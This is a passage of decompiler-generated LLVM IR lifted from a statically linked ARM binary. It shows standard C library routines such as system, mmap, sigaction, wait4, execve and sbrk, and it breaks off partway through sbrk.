dec_label_pc_186c4:                               ; preds = %dec_label_pc_186c4.dec_label_pc_186c4_crit_edge, %dec_label_pc_186c4.lr.ph
  %v1_186c4 = phi i32 [ %v1_186d0, %dec_label_pc_186c4.dec_label_pc_186c4_crit_edge ], [ 0, %dec_label_pc_186c4.lr.ph ]
  %v0_186c4 = phi i32 [ %v0_186c4.pre, %dec_label_pc_186c4.dec_label_pc_186c4_crit_edge ], [ %v2_186b8, %dec_label_pc_186c4.lr.ph ]
  %v4_186c4 = mul i32 %v1_186c4, 4
  %v5_186c4 = add i32 %v4_186c4, %v0_186c4
  %v6_186c4 = inttoptr i32 %v5_186c4 to i32*
  %v7_186c4 = load i32, i32* %v6_186c4, align 4
  store i32 %v7_186c4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_186c4)
  %v0_186d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_186d0 = add i32 %v0_186d0, 1
  store i32 %v1_186d0, i32* %r4.global-to-local, align 4
  %v1_186d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_186d4 = icmp ult i32 %v1_186d0, %v1_186d4
  %v9_186d4 = icmp eq i32 %v1_186d0, %v1_186d4
  store i1 %v9_186d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_186d4, label %dec_label_pc_186c4.dec_label_pc_186c4_crit_edge, label %dec_label_pc_186dc

dec_label_pc_186c4.dec_label_pc_186c4_crit_edge:  ; preds = %dec_label_pc_186c4
  %v0_186c4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_186c4

dec_label_pc_186dc:                               ; preds = %dec_label_pc_186c4
  %v0_186e0.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_186e0 = add i32 %v0_186e0.pre, 108
  %v3_186e0 = inttoptr i32 %v2_186e0 to i32*
  %v4_186e0 = load i32, i32* %v3_186e0, align 4
  store i32 %v4_186e0, i32* %r2.global-to-local, align 4
  store i32 %v4_186e0, i32* %r3.global-to-local, align 4
  %v2_186e8 = icmp eq i32 %v4_186e0, 0
  store i1 %v2_186e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186e8, label %dec_label_pc_18700, label %dec_label_pc_186f0

dec_label_pc_186f0:                               ; preds = %dec_label_pc_186dc
  call void @__pseudo_branch(i32 %v4_186e0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_186fc = load i32, i32* @r0, align 4
  %v2_186fc = inttoptr i32 %v1_186fc to i32*
  store i32 0, i32* %v2_186fc, align 4
  %v0_18704.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_186dc, %dec_label_pc_186f0
  %v0_18704 = phi i32 [ %v0_186e0.pre, %dec_label_pc_186dc ], [ %v0_18704.pre, %dec_label_pc_186f0 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_18704 = add i32 %v0_18704, 84
  %v3_18704 = inttoptr i32 %v2_18704 to i32*
  %v4_18704 = load i32, i32* %v3_18704, align 4
  store i32 %v4_18704, i32* %r2.global-to-local, align 4
  store i32 %v4_18704, i32* %r3.global-to-local, align 4
  %v2_1870c = icmp eq i32 %v4_18704, 0
  store i1 %v2_1870c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1870c, label %dec_label_pc_18724, label %dec_label_pc_18714

dec_label_pc_18714:                               ; preds = %dec_label_pc_18700
  call void @__pseudo_branch(i32 %v4_18704)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_18720 = load i32, i32* @r0, align 4
  %v2_18720 = inttoptr i32 %v1_18720 to i32*
  store i32 0, i32* %v2_18720, align 4
  %v0_18728.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18724

dec_label_pc_18724:                               ; preds = %dec_label_pc_18700, %dec_label_pc_18714
  %v0_18728 = phi i32 [ %v0_18704, %dec_label_pc_18700 ], [ %v0_18728.pre, %dec_label_pc_18714 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_18728 = add i32 %v0_18728, 28
  %v3_18728 = inttoptr i32 %v2_18728 to i32*
  %v4_18728 = load i32, i32* %v3_18728, align 4
  store i32 %v4_18728, i32* %r3.global-to-local, align 4
  %v0_1872c = load i32, i32* @r7, align 4
  store i32 %v0_1872c, i32* %r1.global-to-local, align 4
  %v1_18730 = inttoptr i32 %v4_18728 to i32*
  %v2_18730 = load i32, i32* %v1_18730, align 4
  store i32 %v2_18730, i32* %r2.global-to-local, align 4
  %v0_18734 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_18740 = call i32 @__GI_exit(i32 %v0_18734)
  %v0_18744 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18744, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_18724
  %v1_18744 = load i32, i32* %r1.global-to-local, align 4
  %v2_18744 = load i32, i32* %r4.global-to-local, align 4
  %v5_18744 = sdiv i32 %v2_18744, 4194304
  %v6_18744 = and i32 %v5_18744, %v1_18744
  store i32 %v6_18744, i32* %r1.global-to-local, align 4
  %v8_18748 = shl i32 %v2_18744, %v1_18740
  %v9_18748 = and i32 %v8_18748, %v1_18740
  %v2_1874c = load i32, i32* %ip.global-to-local, align 4
  %v8_1874c = shl i32 %v2_1874c, %v9_18748
  %v9_1874c = and i32 %v8_1874c, %v9_18748
  %v2_18758 = load i32, i32* @r2, align 4
  %v3_18758 = and i32 %v2_18758, %v9_1874c
  store i32 %v3_18758, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18724, %bb66
  %v4_18764 = phi i32 [ %v1_18740, %dec_label_pc_18724 ], [ 0, %bb66 ]
  ret i32 %v4_18764

; uselistorder directives
  uselistorder i32 %v2_18744, { 1, 0 }
  uselistorder i32 %v1_18740, { 1, 0, 2 }
  uselistorder i32 %v0_186e0.pre, { 1, 0 }
  uselistorder i32 %v1_186d4, { 1, 0 }
  uselistorder i32 %v1_186d0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_18694, { 1, 0 }
  uselistorder i32 %v1_18690, { 1, 2, 3, 0 }
  uselistorder i32 %v4_18648, { 1, 0, 2 }
  uselistorder i1 %v8_18590, { 1, 2, 0 }
  uselistorder i32 %v2_18560, { 1, 2, 0 }
  uselistorder i32 %v1_1855c, { 1, 2, 0 }
  uselistorder i1 %v2_18548, { 1, 0 }
  uselistorder i32 %v4_1852c, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_184f8, { 1, 0 }
  uselistorder i32 %v3_184c8, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 5, 7, 6, 0, 1, 3, 2, 4, 9, 8, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 1, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 9, 0, 10, 6, 1, 7, 8, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 47, { 0, 3, 2, 1 }
  uselistorder i32 32770, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 3, 1, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_18724, { 1, 0 }
  uselistorder label %dec_label_pc_18700, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_185ec, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_18560, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_18548, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18784 = load i32, i32* @r4, align 4
  %v0_18790 = load i32, i32* %r0.global-to-local, align 4
  %v2_18790 = icmp eq i32 %v0_18790, 0
  br i1 %v2_18790, label %bb, label %dec_label_pc_187a8

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188c4

dec_label_pc_187a8:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_187b0 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_187c0 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_187d0 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_187d0, i32* @r0, align 4
  %v0_187d8 = call i32 @__vfork()
  store i32 %v0_187d8, i32* %r0.global-to-local, align 4
  store i32 %v0_187d8, i32* @r4, align 4
  %v1_187dc = icmp slt i32 %v0_187d8, 0
  br i1 %v1_187dc, label %dec_label_pc_187e4, label %dec_label_pc_18810

dec_label_pc_187e4:                               ; preds = %dec_label_pc_187a8
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_187ec = call i32 @bsd_signal(i32 3, i32 %v2_187b0)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_187f8 = call i32 @bsd_signal(i32 2, i32 %v2_187c0)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18804 = call i32 @bsd_signal(i32 17, i32 %v2_187d0)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188c4

dec_label_pc_18810:                               ; preds = %dec_label_pc_187a8
  %v2_187dc = icmp eq i32 %v0_187d8, 0
  br i1 %v2_187dc, label %dec_label_pc_18814, label %dec_label_pc_18868

dec_label_pc_18814:                               ; preds = %dec_label_pc_18810
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1881c = call i32 @bsd_signal(i32 3, i32 0)
  %v0_18820 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18828 = call i32 @bsd_signal(i32 2, i32 %v0_18820)
  %v0_1882c = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18834 = call i32 @bsd_signal(i32 17, i32 %v0_1882c)
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35268), i32* %r0.global-to-local, align 4
  %v0_18858 = load i32, i32* @r4, align 4
  %v5_1885c = call i32 @execl(i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35268), i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35260), i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35256), i32 %v0_18790, i32 %v0_18858)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_18864 = call i32 @__GI__exit(i32 127)
  store i32 %v1_18864, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18868

dec_label_pc_18868:                               ; preds = %dec_label_pc_18810, %dec_label_pc_18814
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18870 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1887c = call i32 @bsd_signal(i32 2, i32 1)
  %v2_18888 = ptrtoint i32* %stack_var_-12 to i32
  %v0_1888c = load i32, i32* @r4, align 4
  store i32 %v0_1888c, i32* %r0.global-to-local, align 4
  %v2_18890 = call i32 @wait4(i32 %v0_1888c, i32 %v2_18888)
  store i32 %v2_18890, i32* %r0.global-to-local, align 4
  %v7_18894 = icmp eq i32 %v2_18890, -1
  br i1 %v7_18894, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_18868
  store i32 %v2_18890, i32* %stack_var_-12, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18868, %bb11
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_188a4 = call i32 @bsd_signal(i32 3, i32 %v2_187b0)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_188b0 = call i32 @bsd_signal(i32 2, i32 %v2_187c0)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_188bc = call i32 @bsd_signal(i32 17, i32 %v2_187d0)
  %v3_188c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_188c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %bb, %dec_label_pc_187e4, %bb12
  %v1_188cc = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_187e4 ], [ %v3_188c0, %bb12 ]
  store i32 %v3_18784, i32* @r4, align 4
  ret i32 %v1_188cc

; uselistorder directives
  uselistorder i32 %v2_18890, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32, i32)* @wait4, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 5, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 3, 2, 6, 4, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35268), { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_188c4, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_18868, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_188e0 = load i32, i32* @r4, align 4
  store i32 %v3_188e0, i32* %stack_var_-16, align 4
  %v3_188ec = urem i32 %arg3, 4096
  %v2_188f0 = icmp eq i32 %v3_188ec, 0
  br i1 %v2_188f0, label %dec_label_pc_1890c, label %dec_label_pc_188f8

dec_label_pc_188f8:                               ; preds = %entry
  %v0_188f8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_18904 = inttoptr i32 %v0_188f8 to i32*
  store i32 22, i32* %v2_18904, align 4
  %v0_1893c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1893c

dec_label_pc_1890c:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18938, label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %dec_label_pc_1890c
  %v0_18928 = call i32 @__GI___errno_location()
  %v0_1892c = load i32, i32* %r4.global-to-local, align 4
  %v1_1892c = sub i32 0, %v0_1892c
  %v2_18930 = inttoptr i32 %v0_18928 to i32*
  store i32 %v1_1892c, i32* %v2_18930, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18938

dec_label_pc_18938:                               ; preds = %dec_label_pc_1890c, %dec_label_pc_18928
  %v0_18938 = phi i32 [ %arg1, %dec_label_pc_1890c ], [ -1, %dec_label_pc_18928 ]
  store i32 %v0_18938, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1893c

dec_label_pc_1893c:                               ; preds = %dec_label_pc_188f8, %dec_label_pc_18938
  %v0_1893c = phi i32 [ %v0_1893c.pre, %dec_label_pc_188f8 ], [ %v0_18938, %dec_label_pc_18938 ]
  %v2_18940 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18940, i32* @r4, align 4
  ret i32 %v0_1893c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1893c, { 1, 0 }
  uselistorder label %dec_label_pc_18938, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_18948 = load i32, i32* @r4, align 4
  store i32 %v3_18948, i32* %stack_var_-8, align 4
  %v0_1894c = load i32, i32* @r0, align 4
  %v0_18950 = call i32 @__GI___errno_location()
  %v1_18954 = sub i32 0, %v0_1894c
  %v2_18958 = inttoptr i32 %v0_18950 to i32*
  store i32 %v1_18954, i32* %v2_18958, align 4
  %v2_18960 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18960, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18968 = load i32, i32* @r4, align 4
  %v6_18968 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_18970 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_18970, label %dec_label_pc_189c4, label %dec_label_pc_18988

dec_label_pc_18988:                               ; preds = %entry
  %v1_18988 = add i32 %arg2, 4
  %v2_18988 = inttoptr i32 %v1_18988 to i32*
  %v3_18988 = load i32, i32* %v2_18988, align 4
  store i32 %v3_18988, i32* @r3, align 4
  %v1_1898c = and i32 %v3_18988, 67108864
  %v2_1898c = icmp eq i32 %v1_1898c, 0
  br i1 %v2_1898c, label %dec_label_pc_18994, label %dec_label_pc_189c4

dec_label_pc_18994:                               ; preds = %dec_label_pc_18988
  store i32 20, i32* @r2, align 4
  %v2_18998 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18998, i32* @r0, align 4
  %v0_1899c = call i32 @memcpy()
  store i32 %v2_18998, i32* @ip, align 4
  %v0_189c4.pre = load i32, i32* @r5, align 4
  %v0_189cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_189c4

dec_label_pc_189c4:                               ; preds = %dec_label_pc_18988, %entry, %dec_label_pc_18994
  %v0_189cc = phi i32 [ %arg3, %dec_label_pc_18988 ], [ %arg3, %entry ], [ %v0_189cc.pre, %dec_label_pc_18994 ]
  %v0_189c8 = phi i32 [ %arg2, %dec_label_pc_18988 ], [ 0, %entry ], [ %v2_18998, %dec_label_pc_18994 ]
  %v0_189c4 = phi i32 [ %arg1, %dec_label_pc_18988 ], [ %arg1, %entry ], [ %v0_189c4.pre, %dec_label_pc_18994 ]
  %v4_189d4 = call i32 @__syscall_rt_sigaction(i32 %v0_189c4, i32 %v0_189c8, i32 %v0_189cc, i32 8)
  store i32 %v3_18968, i32* @r4, align 4
  store i32 %v6_18968, i32* @r5, align 4
  ret i32 %v4_189d4

; uselistorder directives
  uselistorder label %dec_label_pc_189c4, { 2, 0, 1 }
}

define i32 @function_189e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_189e8:
  %v0_189e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_189e8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_189e8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_189e8, %bb
  %v0_189f0 = phi i32 [ %arg1, %dec_label_pc_189e8 ], [ 0, %bb ]
  ret i32 %v0_189f0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_18a04 = load i32, i32* @r0, align 4
  ret i32 %v0_18a04
}

define i32 @wait4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18a08 = load i32, i32* @r7, align 4
  store i32 %v3_18a08, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18a30, label %dec_label_pc_18a20

dec_label_pc_18a20:                               ; preds = %entry
  %v0_18a20 = call i32 @__GI___errno_location()
  %v0_18a24 = load i32, i32* %r7.global-to-local, align 4
  %v1_18a24 = sub i32 0, %v0_18a24
  %v2_18a28 = inttoptr i32 %v0_18a20 to i32*
  store i32 %v1_18a24, i32* %v2_18a28, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18a34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18a30

dec_label_pc_18a30:                               ; preds = %entry, %dec_label_pc_18a20
  %v2_18a34 = phi i32 [ %v3_18a08, %entry ], [ %v2_18a34.pre, %dec_label_pc_18a20 ]
  %v0_18a30 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18a20 ]
  store i32 %v2_18a34, i32* @r7, align 4
  ret i32 %v0_18a30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18a30, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18a3c = load i32, i32* @r7, align 4
  store i32 %v3_18a3c, i32* %stack_var_-8, align 4
  %v0_18a48 = load i32, i32* @r0, align 4
  store i32 %v0_18a48, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18a48, -4095
  br i1 %tmp, label %dec_label_pc_18a68, label %dec_label_pc_18a58

dec_label_pc_18a58:                               ; preds = %entry
  %v0_18a58 = call i32 @__GI___errno_location()
  %v0_18a5c = load i32, i32* %r7.global-to-local, align 4
  %v1_18a5c = sub i32 0, %v0_18a5c
  %v2_18a60 = inttoptr i32 %v0_18a58 to i32*
  store i32 %v1_18a5c, i32* %v2_18a60, align 4
  %v2_18a68.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18a68

dec_label_pc_18a68:                               ; preds = %entry, %dec_label_pc_18a58
  %v1_18a6c = phi i32 [ %v0_18a48, %entry ], [ -1, %dec_label_pc_18a58 ]
  %v2_18a68 = phi i32 [ %v3_18a3c, %entry ], [ %v2_18a68.pre, %dec_label_pc_18a58 ]
  store i32 %v2_18a68, i32* %r7.global-to-local, align 4
  ret i32 %v1_18a6c

; uselistorder directives
  uselistorder i32 %v0_18a48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18a68, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_18a80 = load i32, i32* @r0, align 4
  ret i32 %v1_18a80
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18a84 = load i32, i32* @r7, align 4
  store i32 %v3_18a84, i32* %stack_var_-8, align 4
  %v0_18a90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18a90, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18a90, -4095
  br i1 %tmp, label %dec_label_pc_18ab0, label %dec_label_pc_18aa0

dec_label_pc_18aa0:                               ; preds = %entry
  %v0_18aa0 = call i32 @__GI___errno_location()
  %v0_18aa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_18aa4 = sub i32 0, %v0_18aa4
  %v2_18aa8 = inttoptr i32 %v0_18aa0 to i32*
  store i32 %v1_18aa4, i32* %v2_18aa8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18ab0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18ab0

dec_label_pc_18ab0:                               ; preds = %entry, %dec_label_pc_18aa0
  %v1_18ab4 = phi i32 [ %v0_18a90, %entry ], [ -1, %dec_label_pc_18aa0 ]
  %v2_18ab0 = phi i32 [ %v3_18a84, %entry ], [ %v2_18ab0.pre, %dec_label_pc_18aa0 ]
  store i32 %v2_18ab0, i32* %r7.global-to-local, align 4
  ret i32 %v1_18ab4

; uselistorder directives
  uselistorder i32 %v0_18a90, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ab0, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18ab8 = load i32, i32* @r7, align 4
  store i32 %v3_18ab8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18ae0, label %dec_label_pc_18ad0

dec_label_pc_18ad0:                               ; preds = %entry
  %v0_18ad0 = call i32 @__GI___errno_location()
  %v0_18ad4 = load i32, i32* %r7.global-to-local, align 4
  %v1_18ad4 = sub i32 0, %v0_18ad4
  %v2_18ad8 = inttoptr i32 %v0_18ad0 to i32*
  store i32 %v1_18ad4, i32* %v2_18ad8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18ae4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %entry, %dec_label_pc_18ad0
  %v2_18ae4 = phi i32 [ %v3_18ab8, %entry ], [ %v2_18ae4.pre, %dec_label_pc_18ad0 ]
  %v0_18ae0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18ad0 ]
  store i32 %v2_18ae4, i32* @r7, align 4
  ret i32 %v0_18ae0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18ae0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_18afc = load i32, i32* @r0, align 4
  ret i32 %v1_18afc
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_18b10 = load i32, i32* @r0, align 4
  ret i32 %v1_18b10
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18b14 = load i32, i32* @r4, align 4
  store i32 %v3_18b14, i32* %stack_var_-16, align 4
  store i32 26456, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r4.global-to-local, align 4
  %v4_18b24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 26456) to i32*), align 4
  %v2_18b28 = icmp eq i32 %v4_18b24, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_18b28, label %dec_label_pc_18b34, label %dec_label_pc_18b44

dec_label_pc_18b34:                               ; preds = %entry
  %v1_18b38 = call i32 @__GI_brk(i32 0)
  %v1_18b3c = icmp slt i32 %v1_18b38, 0
  br i1 %v1_18b3c, label %dec_label_pc_18b68, label %dec_label_pc_18b44thread-pre-split

dec_label_pc_18b44thread-pre-split:               ; preds = %dec_label_pc_18b34
  %v0_18b48.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_18b44.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18b44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18b44

dec_label_pc_18b44:                               ; preds = %dec_label_pc_18b44thread-pre-split, %entry
  %v1_18b44 = phi i32 [ %v1_18b44.pre, %dec_label_pc_18b44thread-pre-split ], [ 26456, %entry ]
  %v0_18b44 = phi i32 [ %v0_18b44.pre, %dec_label_pc_18b44thread-pre-split ], [ ptrtoint (i32* @global_var_2a010.835 to i32), %entry ]
  %v1_18b58 = phi i32 [ %v0_18b48.pr, %dec_label_pc_18b44thread-pre-split ], [ %arg1, %entry ]
  %v2_18b44 = add i32 %v0_18b44, %v1_18b44
  %v3_18b44 = inttoptr i32 %v2_18b44 to i32*
  %v4_18b44 = load i32, i32* %v3_18b44, align 4
  %v2_18b48 = icmp eq i32 %v1_18b58, 0
  store i32 %v4_18b44, i32* %r4.global-to-local, align 4
  br i1 %v2_18b48, label %dec_label_pc_18b6c, label %dec_label_pc_18b54

dec_label_pc_18b54:                               ; preds = %dec_label_pc_18b44
  %v2_18b58 = add i32 %v4_18b44, %v1_18b58
  %v1_18b5c = call i32 @__GI_brk(i32 %v2_18b58)
  %v1_18b60 = icmp slt i32 %v1_18b5c, 0
